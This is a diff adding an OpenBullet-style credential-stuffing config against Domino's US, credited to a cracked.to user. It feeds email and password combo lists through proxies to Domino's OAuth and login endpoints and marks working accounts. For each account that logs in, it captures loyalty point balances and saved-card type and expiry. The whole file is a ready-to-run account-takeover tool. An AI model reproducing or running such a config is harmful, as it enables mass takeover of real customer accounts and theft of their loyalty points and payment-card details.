@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Domino's US [~Brand6n~]",
+  "SuggestedBots": 30,
+  "LastModified": "2019-02-14T00:12:36.2236442+01:00",
+  "AdditionalInfo": "Brand6n#4780 - cracked.to",
+  "Author": "Brand6n",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_Token_Auth REQUEST POST "https://api.dominos.com/as/token.oauth2" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login_check KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination." 
+#Token_Auth PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_Login REQUEST POST "https://order.dominos.com/power/login" AutoRedirect=TRUE 
+  CONTENT "loyaltyIsActive=true&rememberMe=true&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CustomerID PARSE "<SOURCE>" JSON "CustomerID" Recursive=FALSE -> VAR "CustomerID" "" "" 
+#GET_Loyalty REQUEST GET "https://order.dominos.com/power/customer/<CustomerID>/loyalty" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_Available_Points PARSE "<SOURCE>" JSON "VestedPointBalance" Recursive=FALSE -> CAP "Available Points" "" "" 
+#PARSE_Pending_Points PARSE "<SOURCE>" JSON "PendingPointBalance" Recursive=FALSE -> CAP "Pending Points" "" "" 
+#GET_Card REQUEST GET "https://order.dominos.com/power/customer/<CustomerID>/card" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/vnd.dominos.customer.card+json;version=1.0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_Cardtype PARSE "<SOURCE>" JSON "cardType" Recursive=TRUE -> CAP "CardType" "" "" 
+#PARSE_ExpireYear PARSE "<SOURCE>" JSON "expirationYear" Recursive=TRUE -> CAP "ExpirationYear" "" "" 
+#Made_by_Brand6n#478- PARSE "<SOURCE>" JSON "expirationMonth" Recursive=TRUE -> CAP "ExpirationMonth" "" "" 
